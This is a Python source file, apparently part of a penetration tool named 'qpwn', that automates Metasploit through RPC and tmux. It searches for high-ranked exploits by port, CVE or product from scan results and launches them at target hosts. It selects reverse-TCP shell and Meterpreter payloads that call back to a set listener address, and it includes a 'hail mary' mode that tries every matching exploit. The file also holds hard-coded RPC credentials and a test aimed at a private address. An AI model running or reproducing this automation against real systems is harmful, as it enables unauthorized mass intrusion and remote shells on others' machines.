# ======================================================================================================================
# METASPLOIT INTEGRATION
# ======================================================================================================================
import subprocess
import pymetasploit3.msfrpc as msfrpc
import os
import time
import json
from lib.scanner import get_ports_from_product

msf_client: msfrpc.MsfRpcClient = None

# Metasploit options.
msfconsole_command = 'msfconsole -x "use {};set RHOSTS {};set RPORT {};set LHOST {};set LPORT 443;show targets"'
payload_lhost = "10.192.0.13"
payload_lport = 1000 # Starting lport.

# Metasploit Control Options
tmux_session: str = "qpwn-msfconsole" # The session name of the msfconsole.
tmux_msf_window: str = "msfconsole" # The window for msfconsole.
tmux_filepath: str = "/usr/bin/tmux" # The file location of tmux.
msf_host: str = "127.0.0.1" # Metasploit RPC listens here.
msf_port: int = 55552 # Metasploit RPC port
msf_do_ssl: bool = False # Turn on or off SSL for RPC control.
msf_username: str = "msf" # Metasploit username for RPC control
msf_password: str = "msf_pass" # Super secret metasploit password for RPC control.
msf_search_result_max: int = 10 # Try exploits on at most this number of search results.

def start_metasploit_tmux():
    global tmux_session, tmux_msf_window, tmux_filepath, msf_password, msf_client, msf_username, msf_host, msf_port, msf_do_ssl
    start_rpc_cmd = f"load msgrpc Pass='{msf_password}' User='{msf_username}' SSL={str(msf_do_ssl).lower()} ServerHost={msf_host} ServerPort={msf_port}"
    do_start_tmux = True

    # Check if tmux exists
    if not os.path.isfile(tmux_filepath):
        raise Exception("Unable to find tmux, please install tmux and msfconsole.")

    result = subprocess.run([tmux_filepath, 'ls'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in result.stdout.decode("UTF-8").splitlines():
        if line.find(f"{tmux_session}:") == 0:
            print("Metasploit tmux session already exists.")
            # send_keys_to_msfconsole(start_rpc_cmd)
            do_start_tmux = False

    if do_start_tmux and os.fork() == 0:
        os.execl(tmux_filepath, tmux_filepath, "new-session", "-d", "-s", tmux_session, "-n", tmux_msf_window, f'msfconsole -x "{start_rpc_cmd}"')
        exit(0)

    max_retries = 10
    while msf_client is None and max_retries > 0:
        try:
            print("Connecting to MSF RPC...")
            msf_client = msfrpc.MsfRpcClient(password=msf_password, username=msf_username, port=msf_port, ssl=msf_do_ssl, server=msf_host)
        except:
            max_retries -= 1
            msf_client = None

    if msf_client is None:
        raise Exception("Unable to connect to msf rpc.")

    print("Done!")


def send_keys_to_msfconsole(keys: str, do_press_enter: bool = True):
    global tmux_session, tmux_msf_window, tmux_filepath

    os.system(f"{tmux_filepath} send-keys -t {tmux_msf_window}.0 \"{keys}\" {'Enter' if do_press_enter else ''}")


def get_console_output_of_msfconsole():
    global tmux_session
    # tmux capture-pane -t qpwn-msfconsole.0 -pS -
    result = subprocess.run([tmux_filepath, 'capture-pane', "-t", f"{tmux_session}.0", "-pS", "-"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode("UTF-8")


def run_msf_exploit(exploit_name: str, rhosts: str, rport: int):
    global msf_client

    def execute_payload_async(payload_name: str, exploit):
        global payload_lhost
        global payload_lport

        msf_payload = msf_client.modules.use('payload', payload_name)
        try:
            msf_payload['LHOST'] = payload_lhost
        except:
            pass
        try:
            msf_payload['LPORT'] = payload_lport
        except:
            pass
        payload_lport += 1
        try: exploit.execute(payload=msf_payload)
        except: pass

    if msf_client is None:
        return

    exploit_name = exploit_name.strip()
    if exploit_name.find('exploits/') == 0:
        exploit_name = exploit_name.replace('exploits/', '', 1)

    if is_msf_exploit_untested(rhosts, rport, exploit_name):
        log_msf_exploit_attempt(rhosts, rport, exploit_name)
    else:
        print(f"Already attempted: {rhosts}:{rport} - {exploit_name}")
        return

    print(f"Attempting {exploit_name} on {rhosts}:{rport}")

    exploit = msf_client.modules.use('exploit', exploit_name)
    try:
        exploit['RHOSTS'] = rhosts
    except:
        pass

    try:
        exploit['RPORT'] = str(rport)
    except:
        pass

    for payload in exploit.targetpayloads():
        # Ignore all the payloads we don't want to try...
        if payload.upper().find('BIND') > 0:
            # print("Ignoring bind exploits....")
            continue

        if payload.upper().find('NAMED_PIPE') > 0:
            # print("Ignoring named pipe exploits....")
            continue

        if payload.upper().find('IPV6') > 0:
            # print("Ignoring ipv6 exploits....")
            continue

        if payload.upper().find('INTERACT') > 0 or (payload.upper().find('REVERSE_TCP') > 0 and payload.upper().find('REVERSE_TCP_') < 0):
            pass
        else:
            # print("Not an interactive nor reverse shell...")
            continue

        if payload.upper().find("INTERACT") > 0 or payload.upper().find("SHELL") > 0 or payload.upper().find("METERPRETER") > 0:
            pass
        else:
            # print("Not an interact, shell, nor meteterpreter session.")
            continue

        if payload.upper().find("POWERSHELL") > 0:
            # print("Ignoring powershell.")
            continue

        # print(f"Attempting {rhosts}:{rport} - {exploit_name}:{payload}")

        # new_thread = threading.Thread(target=execute_payload_async, args=[payload, exploit])
        # new_thread.start()
        execute_payload_async(payload, exploit)


def run_msf_search(search_args: str):
    global msf_client
    global cached_msf_searches

    if search_args in cached_msf_searches:
        return cached_msf_searches[search_args]

    new_console: msfrpc.MsfConsole = msf_client.consoles.console()
    while new_console.is_busy():
        time.sleep(0.01)
    new_console.read()
    new_console.write(f"search {search_args}")
    while new_console.is_busy():
        time.sleep(0.01)

    search_results: str = new_console.read()['data']
    all_results = []

    for line in search_results.splitlines(keepends=False):
        line = line.strip()
        if len(line) > 0 and line[0].isdigit():
            while line.find('   ') >= 0:
                line = line.replace('   ', '  ')
            result = line.split('  ')
            while "" in result:
                result.remove("")

            all_results.append(result)

    new_console.destroy()

    cached_msf_searches[search_args] = all_results

    return all_results


def run_msf_hail_mary_on_ip_port(rhost: str, rport: int):
    global msf_client
    global msf_search_result_max
    exploit_count = 0

    search_results = run_msf_search(f"port:{str(rport)} type:exploit rank:excellent -s date -r")

    for result in search_results:
        if exploit_count < msf_search_result_max:
            # print(result)
            if is_msf_exploit_untested(rhost, rport, result[1]):
                run_msf_exploit(result[1], rhost, rport)
                exploit_count += 1
        # new_thread = threading.Thread(target=run_msf_exploit, args=[result[1], rhost, rport])
        # new_thread.start()


def run_msf_against_cve(cve: str, rhost: str, rports:list):
    global msf_search_result_max
    exploit_count = 0
    search_results = run_msf_search(f"cve:{cve.replace('CVE-','')} type:exploit rank:excellent -s date -r")

    for result in search_results:
        for rport in rports:
            if exploit_count < msf_search_result_max:
                if is_msf_exploit_untested(rhost, rport, result[1]):
                    run_msf_exploit(result[1], rhost, rport)
                    exploit_count += 1
            # new_thread = threading.Thread(target=run_msf_exploit, args=[result[1], rhost, rport])
            # new_thread.start()


def run_msf_against_product(product: str, rhost: str, rport:int):
    global msf_search_result_max
    exploit_count = 0
    search_results = run_msf_search(f"description:{product} type:exploit rank:excellent  -s date -r")

    for result in search_results:
        if exploit_count < msf_search_result_max:
            if is_msf_exploit_untested(rhost, rport, result[1]):
                run_msf_exploit(result[1], rhost, rport)
                exploit_count += 1
        # new_thread = threading.Thread(target=run_msf_exploit, args=[result[1], rhost, rport])
        # new_thread.start()


def run_msf_against_scan_result_cves(scan_result):
    for ip in scan_result:
        for product in scan_result[ip]['vulns']:
            for cve in scan_result[ip]['vulns'][product]:
                ports = get_ports_from_product(scan_result, ip, product)
                run_msf_against_cve(cve, ip, ports)


def run_msf_against_scan_result_products(scan_result):
    for ip in scan_result:
        for port in scan_result[ip]['ports']:
            product = scan_result[ip]['ports'][port]['product']
            if len(product) > 1:
                run_msf_against_product(product, ip, port)


def run_msf_hail_mary_scan_result(scan_result):
    for ip in scan_result:
        for port in scan_result[ip]['ports']:
            run_msf_hail_mary_on_ip_port(ip, port)


def log_msf_exploit_attempt(ip: str, rport:int, exploit_name:str):
    global all_attempted_msf_exploits

    if not ip in all_attempted_msf_exploits:
        all_attempted_msf_exploits[ip] = {}

    if not str(rport) in all_attempted_msf_exploits[ip]:
        all_attempted_msf_exploits[ip][str(rport)] = []

    if not exploit_name in all_attempted_msf_exploits[ip][str(rport)]:
        all_attempted_msf_exploits[ip][str(rport)].append(exploit_name)


def is_msf_exploit_untested(ip: str, rport:int, exploit_name:str):
    global all_attempted_msf_exploits

    if ip not in all_attempted_msf_exploits:
        return True

    if str(rport) not in all_attempted_msf_exploits[ip]:
        return True

    if exploit_name not in all_attempted_msf_exploits[ip][str(rport)]:
        return True

    return False


def metasploit_test():
    start_metasploit_tmux()
    run_msf_hail_mary_on_ip_port("192.168.1.102", 21)
    time.sleep(2)
    # print(get_console_output_of_msfconsole())


def save_msf_metadata():
    global cached_msf_searches_filename
    global results_dir

    with open(results_dir + "exploits_attempted.json", "w") as outfile:
        json.dump(all_attempted_msf_exploits, outfile, indent=2)

    with open(cached_msf_searches_filename, "w") as outfile:
        json.dump(cached_msf_searches, outfile, indent=2)

